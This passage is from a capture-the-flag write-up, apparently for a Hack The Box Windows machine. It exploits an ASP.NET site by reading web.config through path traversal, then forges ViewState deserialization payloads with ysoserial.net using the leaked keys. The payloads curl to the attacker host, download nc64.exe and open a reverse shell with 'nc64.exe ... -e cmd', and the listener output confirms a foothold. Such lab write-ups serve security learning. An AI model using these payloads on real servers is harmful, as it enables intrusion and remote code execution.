<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span></span></span></span></code></pre><div id="https://www.notion.so/bf75543db96f46228681d8005cad67a6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/01a9aba0035045aaa06e77cfabf564c5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">ASP.NET ViewState:</strong></span></span></p></div><div id="https://www.notion.so/406e23403f824b319975daad9e07d121" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">At this point I tried automating the entire LFI process, as manually exploiting it in Burp is rather tedious. However, I had some issues with all the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">VIEWSTATE</code></span><span class="SemanticString">-related parameters, as modifying or removing any of them would result in an error.</span></span></p></div><pre id="https://www.notion.so/9e5ff79f367b4e378aa2a4ed02080d28" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token assign-left variable">__EVENTTARGET</span><span class="token operator">=</span>download<span class="token operator">&amp;</span><span class="token assign-left variable">__EVENTARGUMENT</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">__VIEWSTATE</span><span class="token operator">=</span>QcByRLrjXn3hFWxM15UQ87i6KT%2FZ1EXSmd2rpqocz0sJTVE7oPhYp9AyMXzreMOxLgUh5CxJMUaoXPpG3plq4jz8frc%3D<span class="token operator">&amp;</span><span class="token assign-left variable">__VIEWSTATEGENERATOR</span><span class="token operator">=</span>8E0F0FA3<span class="token operator">&amp;</span><span class="token assign-left variable">__EVENTVALIDATION</span><span class="token operator">=</span>tWuckc25M6EviYqOiju5dBFkw%2B5B%2BdafRLnVfpM1aYqW1p64gInOBOCdoSZI73%2BL2A8jz22wAxf850i48OrTm74adTx5bj%2Bil2LWb4wxXFHfljzV6OnZwr4ag7oilxAEnPsStQ%3D%3D<span class="token operator">&amp;</span><span class="token assign-left variable">file</span><span class="token operator">=</span><span class="token punctuation">..</span><span class="token punctuation">\</span>web.config</span></span></span></code></pre><div id="https://www.notion.so/ec9b156a362f47e1aa488c5b7f32f50a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After some Googling, I learned that ViewState is another </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="http://ASP.NET">ASP.NET</a></span><span class="SemanticString"> feature for preserving page state between postbacks. They are serialized into base64-encoded strings and stored as hidden form values, which will be included in each postback request. You can read more about this in </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://learn.microsoft.com/en-us/previous-versions/aspnet/bb386448(v=vs.100)">Microsoft’s documentation</a></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/d26e0ed08c434afe9ac98fea18312453" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I also came across </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/">this blog post</a></span><span class="SemanticString">, where it details how ViewState can be vulnerable to deserialization attacks. Under certain circumstances, it may be possible to forge a malicious ViewState value and gain RCE on the server.</span></span></p></div><div id="https://www.notion.so/762c669b630f446db6609e5df9fd92fc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/e2cc0081986b464d9f01af409435c0c8" class="Divider"></div><h3 id="https://www.notion.so/84b155a5dfe8463fa3e11e8b82ee913b" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/84b155a5dfe8463fa3e11e8b82ee913b"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Exploitation:</span></span></h3><div id="https://www.notion.so/b263c6ee886d400798f65aaed9d3d1aa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">ViewState Deserialization:</strong></span></span></p></div><div id="https://www.notion.so/8576c1cba154419ea8ad641d8e661a15" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817">This blog post</a></span><span class="SemanticString"> gives a detailed walkthrough on how to exploit ViewState’s deserialization. Since the target is running ASP.NET 4.5, we need the machine key, decryption key and the decryption algorithm, all of which can be found in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">web.config</code></span><span class="SemanticString"> downloaded earlier. Also, there’s a public tool called </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a></span><span class="SemanticString"> that makes generating the deserialization payload trivial.</span></span></p></div><div id="https://www.notion.so/502f9964b14b49a3a2d3daf24c06a57a" class="ColorfulBlock ColorfulBlock--BgGray Callout"><div class="Callout__Icon"><div class="Icon">💡</div></div><p class="Callout__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Important:</strong></span><span class="SemanticString"> The tool is flagged as virus by Windows Defender, and Chrome also blocks its download. Only run it in a safe and controlled environment. It’s recommended to download the release ZIP directly to a whitelisted folder.</span></span></p></div><div id="https://www.notion.so/a373aaebdb4a4c0bbff1ffc68e116731" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><pre id="https://www.notion.so/a8a4ca9a1dfe40c387111fbcb7380f5a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground&gt;</span></mark></span><span class="SemanticString"><span> $url = &quot;https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip&quot;

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground&gt;</span></mark></span><span class="SemanticString"><span> Invoke-WebRequest -Uri $url -OutFile ysoserial.zip

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground&gt;</span></mark></span><span class="SemanticString"><span> dir

    Directory: C:\Playground

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---           9/02/2024  6:56 PM        5303737 ysoserial.zip

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground&gt;</span></mark></span><span class="SemanticString"><span> Expand-Archive .\ysoserial.zip</span></span></span></code></pre><div id="https://www.notion.so/46bdcc9150cd42bab7653deb034e1710" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For a quick POC, I’ll generate a payload that sends a GET request back to my HTTP server:</span></span></p></div><pre id="https://www.notion.so/f9f48d843a6a48dc90aaf53ade2812d5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground\ysoserial\Release&gt;</span></mark></span><span class="SemanticString"><span> $payload = &quot;curl http://10.10.14.5:8000&quot;

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground\ysoserial\Release&gt;</span></mark></span><span class="SemanticString"><span> $path = &quot;/portfolio/default.aspx&quot;

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground\ysoserial\Release&gt;</span></mark></span><span class="SemanticString"><span> $decryptkey = &quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot;

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground\ysoserial\Release&gt;</span></mark></span><span class="SemanticString"><span> $valkey = &quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground\ysoserial\Release&gt;</span></mark></span><span class="SemanticString"><span> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c $payload --path=$path --apppath=&quot;/&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=$decryptkey --validationalg=&quot;SHA1&quot; --validationkey=$valkey

YaJrRRlbsn8Z5JqwRYrCaxu4D84mGfKwXksRQhGKgW%2FeMuvoiBkaaWiHVos2lMrdxvuK45D1l2hnsZc1wKkdhFtWNtJbBQYSe3rCBejpHl%2FyxO02bTmgV4fX1mIARAik0yH7u%2BxNYNROPxITilJAfhkyUMZkh9QZ2CeoL8QpxIW0Q%2B681zUKInAA6vp98XQUm%2BhjrFbvyXcQwQEJp22wjxbnJXE76OfwQkm%2BbjMsVr%2BRpOzqGBKhsj3ScdXaef6m1cBNbxkF2JiPznOOe4JIiiDKQ3KNwTL9dF5s0KC7%2FUmm8J7GzvzPJbTCxXtIKHHnvaK1KnhmvE%2BRcmdWk6wGpR4ZC7%2BQbohA%2BeiW%2BzKGmQleo2R%2FB9aIt%2BDLvTVNByWJsm83QzQ5DUspfnrDL9YmBaYX3kXoyLVMs6r2D%2BFO0%2BefvFSKyvdVV9hkq1Ke9MZaJlqagQKoeOjJTPwByy1XDZlvuLoIH7Hw8qd6fMkle2rSnwirxucDA%2BCqjJAgvGILtvVHioLHQlQE3bD1ay15aKJyJ68WuY2xFvrL9nhGo7WOqgze%2B3FlPE8gfS%2FVQgwkUplLEt%2FzCHzMEESCY2HCZsSn7%2BXRQKu9rcP0BqrAgq4SYP4asPyHVn9C%2F75HKR24VkACTNgETWur3IcbKTocaZZ4Y3Q3f7Pb3uXgQNsrAwZB4R9P0%2FbWKnCjzOEGZimObXbyIOwJ3V5ALqiIqU4GwigmUdBAoVcJ%2BAaF%2BLaPU1BwwoKbHBgJi6VzuNJzvMQsw5PDAiqxh%2BdbaUKqyhW1qX%2FY9rA%2Br066CRaKivqVrjyauBoJvjwY6K%2BixJoW7grM57FTpc4ch97LOCW1dLuzJ6Pdcozs9Kd7C9C4Ljnop126XfvwVBo0mmcg6%2B6GX%2BjlQFiMPyC3eHVrNtlEJckVdN%2F%2F6gYB2Z74GjnCiVmkJSWPWbMNuKmdA1zcF3%2BBd52IGRAveygxK6qpnMvph8VpNYzP6CdbSZOV1qtOCWtFyj6celNpZ31fbywRNc%2BEvtBqPWoweB7qdDN%2BOwSiHdcG1QZbdOoYA%2BPP6PSozZpzMK9peo6Ae4spf9pXkAQWQra%2B4HJ6Jr2ME6RF9ob4YmzPYCJA4DRZsrhEUbYWyySIOJxk2yOWb5%2FenFAT3OuhTTXrvYzKxp22OwQat8aAnlI3pLSJkoiRju85SYpBlzA5Ci6EOJBYEfCObyQtiKzCudX90Ljs%2BAEtUcq7qrY%2Fwh8zgP7%2FjQR5Xcp7wCONoodFqR0XJvJBVDkqTNFFeVFFwpeDWcNCI7ZXVZbYbSv3JcDHXeQzABg%3D</span></span></span></code></pre><div id="https://www.notion.so/c2a8dd5c157d4ebdbdab3d8bc522e75f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Going back to the Repeater tab, I’ll replace the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">__VIEWSTATE</code></span><span class="SemanticString"> parameter with the generated payload, and send the request.</span></span></p></div><div id="https://www.notion.so/1d03c4ba12d74b97a7d98f6bd754c4f3" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fbf05ba11-66f8-449e-9bdf-d86c2bbd668b%2FUntitled.png?width=823&amp;table=block&amp;id=1d03c4ba-12d7-4b97-a7d9-8f6bd754c4f3"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fbf05ba11-66f8-449e-9bdf-d86c2bbd668b%2FUntitled.png?width=823&amp;table=block&amp;id=1d03c4ba-12d7-4b97-a7d9-8f6bd754c4f3" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/e4b780e7253c424fb7a52424051812ec" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And a GET request is detected. Code execution successful!</span></span></p></div><pre id="https://www.notion.so/a291de6143984f1495926ceca393093b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/pov]
└─$</span></mark></span><span class="SemanticString"><span> python -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.154.68 - - [09/Feb/2024 19:17:41] &quot;GET / HTTP/1.1&quot; 200 -</span></span></span></code></pre><div id="https://www.notion.so/87d5f9ffe404460fbdc4076b97784673" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For a reverse shell, I’ll first download a </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/int0x33/nc.exe/">nc binary</a></span><span class="SemanticString"> to the box, and save it in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">C:\Windows\Temp</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/c301edabfa0442d0a7345fe8984b187a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground\ysoserial\Release&gt;</span></mark></span><span class="SemanticString"><span> $payload = &quot;curl http://10.10.14.5:8000/nc64.exe -o c:\\windows\\temp\\nc64.exe&quot;

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground\ysoserial\Release&gt;</span></mark></span><span class="SemanticString"><span> $path = &quot;/portfolio/default.aspx&quot;

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground\ysoserial\Release&gt;</span></mark></span><span class="SemanticString"><span> $decryptkey = &quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot;

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground\ysoserial\Release&gt;</span></mark></span><span class="SemanticString"><span> $valkey = &quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground\ysoserial\Release&gt;</span></mark></span><span class="SemanticString"><span> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c $payload --path=$path --apppath=&quot;/&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=$decryptkey --validationalg=&quot;SHA1&quot; --validationkey=$valkey

9dUEAkmO%2FywVrT1VTR7YBg1KoHwqpXogOC342Vlvw09iqL3aqsgFO0A8LqFaexEeVe%2BETISRRYuKBg8klj709gD8uzbqeVVxmjC4iNK0rcXpMuSKHMiRaek8jaFUp%2BAW9gGQh2KG0gL%2B5kyY1LD667Vp8N0JbtUBMzB%2FP0YeN9Stax4KFaxN38gHdsqjdix2lXsmWYcBvMhZH4jfSA1DTRfE2SJjrgfj75WXHkidg%2FOaxSGxN4qomJNR50AvugFkik%2FS5pk%2FLli0sD5R0ylnw5p2Znvc2GY1WCtugtKUrAuQlbvCFC%2FfQcUUKAv0tH72Oa6SNgAqkVakUM7W%2FfCJOCS1pQ45C91h9rVHmzFlRp8NEMLfn52%2BRQp9H%2F%2BuOz2GsX4i5e7wPL3cmOaERazuGeIjd7cQfaoHt75TNz%2Bz5wjEXxUMXe2WOm5GL9xSVqAUKtg8qVA%2BQwhpacSvRFPp8srGa8etX9FSkh%2Feh8g2qgHRglJhwrLMTlKaJNE9tZz7Rg%2Fsx%2BmUCEulhM%2B9ou0X1sZzjHiTH8hAKafK2VgE7IXAF4CFeZJa4riq0K2%2F9vJiNAxCiT2XEliX%2B7n33VUDwqTQPwyeuwoJ3p9SIhozNs81lYc39VCTg7e3KUxDL9lsgISpgdfU1mfpiJJenpy21C3XaJ5nlz7h3YTDGZDKBbjr6KcTAqEphluLyixfIY%2FTZP9T%2BslwiPPvKZFW5Xezur%2F34wVy3oaWzAaU%2F2JaQElEUR7xvREisu2fvwCjXlIWOhmcUSIiMQBbuY8rp7mqSQ%2BwGASPfTBJddPlxyXJps4zZJ%2BWVJTZILv4LJ3aHNFzf%2Fpy6BQxBVNWxmk7C7lbRMpoRIYLRC1KTaawtFvV0GZNNhSVjFA5exGvgvOKb3OLjrG21du%2BiDUdWanJBXrFp0W3UyagB05mDO%2Fndvjsr4tD9AiXkRsk8G8ujM77SR9BZWk1YhBcJTPw5UdCl6yPEsXE3dWlz9%2BJsshpxN3jGz4z9EVwggPJX841jbvgRlDvGIXixqvgENLmvKvIYNC06bzjgkHNg%2FQakLiA54CPjdYIiQiyOBrjUKgGC9LHgd3KyJkpWrsZbgl8jk9GLll%2BNUqHFlQpgst3m2MOQQFJm04NGPoXTNNFqD34GI6vPlrQBTuRNIGF%2B%2F6AnZwCvJ%2B18xfHB3iovD2dMS2QhvdHTeVJHCDbiCRpWJP8qYDKcKMS1%2B4M0%2Fhwkb%2F5r0z6B4dgudSvs%2Bv2ZuatqWMnzk%2BtD25xsoRMC9IuXhuAFTnaaN9kcYLQIkCSXPbjOd5MJAyqZbIyKsDOq%2BVEGlgNouEQP4cKNNwXxggzlR%2Bd60B99ZobFG4J%2BTcSxiBkiCDptLIY59fFWMU%3D</span></span></span></code></pre><div id="https://www.notion.so/1fb982b455ee479aa20e7793654e1d17" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5873fcb3-4d76-4498-b1a4-d102625bf79b%2FUntitled.png?width=807&amp;table=block&amp;id=1fb982b4-55ee-479a-a20e-7793654e1d17"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F5873fcb3-4d76-4498-b1a4-d102625bf79b%2FUntitled.png?width=807&amp;table=block&amp;id=1fb982b4-55ee-479a-a20e-7793654e1d17" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/b2f9927a35a748388a85bd86279130c9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The HTTP server log confirming the download request:</span></span></p></div><pre id="https://www.notion.so/911c302407be4306970d2b728883d8a0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>10.129.154.68 - - [09/Feb/2024 19:19:25] &quot;GET /nc64.exe HTTP/1.1&quot; 200 -</span></span></span></code></pre><div id="https://www.notion.so/a7c9fb1321884894a32a1d8a91504cf3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I’ll set up a listener on port 8001, and run the uploaded binary to send back a reverse shell.</span></span></p></div><pre id="https://www.notion.so/7fa649efa9ec4dfab5edf77b7ea7826f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground\ysoserial\Release&gt;</span></mark></span><span class="SemanticString"><span> $payload = &quot;c:\\windows\\temp\\nc64.exe 10.10.14.5 8001 -e cmd&quot;

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground\ysoserial\Release&gt;</span></mark></span><span class="SemanticString"><span> $path = &quot;/portfolio/default.aspx&quot;

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground\ysoserial\Release&gt;</span></mark></span><span class="SemanticString"><span> $decryptkey = &quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot;

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground\ysoserial\Release&gt;</span></mark></span><span class="SemanticString"><span> $valkey = &quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>C:\Playground\ysoserial\Release&gt;</span></mark></span><span class="SemanticString"><span> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c $payload --path=$path --apppath=&quot;/&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=$decryptkey --validationalg=&quot;SHA1&quot; --validationkey=$valkey

CIbizdP5QVHv7%2B0cNpd3xdO3TOOAa3DgqiP8K2eeBAW4GnfYbggaFt78CRcFHCRTOVuFw8vv4F0Cc1zfhUxR7t5YArODQSAt6eEmHQOYx78pVJZzktuyG9ZrAAByqa3bo2pXwKbJUMcxhikQszGtwoPPOtxjb2ei168ycP2xD5Dn4hAYqkOvN3uapdrLPOaoYxuA9BXBUGxvCJvxH2uSyjkIzgW3%2FuyiDHIcpmMuETCm4x8at1oijHtwm1wbNg03X18NeTokY%2F5F7qnovohNLIgCZPxAl8JjRB1lbXPy7k89ZhkGLfW60BIwLOyDInMtstzbeNGmwnlh5Qo2pnbHj4VnNg4IBOAi8BAwYXIIVHM77teU4s4N%2BR%2FR1SGTlMDifWCmAmivUUKdLgH9m0RCRNVL7S5yD%2B72VSliUactBbpWzd4mZ7mSO3qeBMxFm0J2EV5Pxrtp973fnOxf69FYFoNppLzE%2BdabL%2FHXnXj1MAJtIpRFaCeeg69yyxFWaFwg%2FUgNG%2FN3H7qymiImEjEVkjO7pDDXEC8CoYdX8xvatPqb1Fq5zevcjuKwNCDN0ocOEV3GWYBrJYIBw5FY9bK9d05MNydo%2F1E4mHJRgFbbBhRX11D6Iz1C%2Fiyby3iBfi0jKpKTeRLW%2Bd%2BOJ61q2MMxr3KrMwqyAhAT4inJO2wHLj8e%2FmprsaqBwt%2FEOgNfb%2Fxpzk3w3nidE04VFFCF%2BzaVamFRxKu5XsYhBMhVBAWE20wa2rI9wf8UWTX88l%2BIAWjwz%2FiQe%2FM4c52jiGvvKjecqKb1t%2BJpxBn19YbG5EZDoUHitihjWoM%2F%2BsOva9inPONAJANzg%2BpXz5gN59gybW8VEcFYC%2BnHUuv2so8PAOh9yjDSBdCneQewBCZ6h5dD1tfLt%2FIWtkMxTLavqX2TX2DUnsjB0v3cuq03GeTtUts93Mxber0Rm%2BfCb9j1NK%2FercJJy%2Bi%2FSO%2Bjf%2BQhoqgXNfWr2wsR%2FV4YcVJRvlOIGM%2B0%2B%2Bjm9Bi1Du%2F70nAWg5ZMcA0lMzb9ymDSM2kxc022EzOv81LLJB%2FCPcZ2bfo5WRTWmthrCP%2FaQcfonukJuZLVtbwO%2F0MV5kBL7s8exeln%2FCBn0Q4elXVB5CXxVml0KvOqbx08whZs5899sckEvvvSwl%2Be3n5CWi9fPSsvIxKDsjfbyGvQXU6MmB8efn65yGlnOaaQlkbh%2FMDCYK9TP9zkDCuiGC01Hnxmer%2BTT62I1Vgtk1sgoKWzw1XWe5oGO3yDKjVTQdjpt%2FASEYrxlxnPJM60Lf0w3iu%2BCS%2B1lUpKAxzbnDlh1zEzIwQMm0NecT3FrYa4PQIsTYolHQPKHGsYzUscHbPzIw%3D%3D</span></span></span></code></pre><div id="https://www.notion.so/dddf66cbce3b416ba3cd6fde99cb5218" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6110cf6b-0c2a-4258-934f-a9a13e55a9f1%2FUntitled.png?width=814&amp;table=block&amp;id=dddf66cb-ce3b-416b-a3cd-6fde99cb5218"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6110cf6b-0c2a-4258-934f-a9a13e55a9f1%2FUntitled.png?width=814&amp;table=block&amp;id=dddf66cb-ce3b-416b-a3cd-6fde99cb5218" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/c7c44093c4974109ad218bf8bb2510fb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And like that, I got foothold on the box as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">pov\sfitz</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/e10e8f94161b420ca02dfa4bfab0004f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/pov]
└─$</span></mark></span><span class="SemanticString"><span> sudo nc -lvnp 8001

listening on [any] 8001 ...
connect to [10.10.14.5] from (UNKNOWN) [10.129.154.68] 49679
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>C:\windows\system32\inetsrv&gt;</span></mark></span><span class="SemanticString"><span> whoami

pov\sfitz</span></span></span></code></pre><div id="https://www.notion.so/298f6509d54f46c99a0c5052a8ff4300" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/60f6a5a0ea7948ba8132156915d7c97f" class="Divider"></div><h3 id="https://www.notion.so/024ccaa8a77b43ea9675d7dd5da60529" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/024ccaa8a77b43ea9675d7dd5da60529"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">sfitz</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/889eba1bcde74f18b051fc293eb70412" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span 